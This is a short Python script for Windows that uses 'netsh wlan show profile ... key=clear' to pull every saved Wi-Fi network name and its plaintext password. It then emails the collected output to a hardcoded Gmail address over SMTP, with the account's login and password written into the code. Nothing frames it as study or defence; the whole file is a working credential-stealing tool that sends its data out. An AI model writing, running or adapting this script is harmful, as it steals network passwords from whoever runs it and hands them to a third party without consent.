import subprocess
import smtplib
import re
# import pkg_resources.py2_warn


command1 = "netsh wlan show profile"
networks = subprocess.check_output(command1, shell=True, encoding='utf8')
networks_list = re.findall('(?:Profile\s*:\s)(.*)', networks)

final_output = "".encode()
for network in networks_list:
    command2 = f"netsh wlan show profile {network} key=clear"
    one_network_result = subprocess.check_output(command2, shell=True)
    final_output += one_network_result

server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
server.login("ftime2882@gmail.com", "ftime000ftime")
server.sendmail("ftime2882@gmail.com", "ftime2882@gmail.com", final_output)
server.quit()
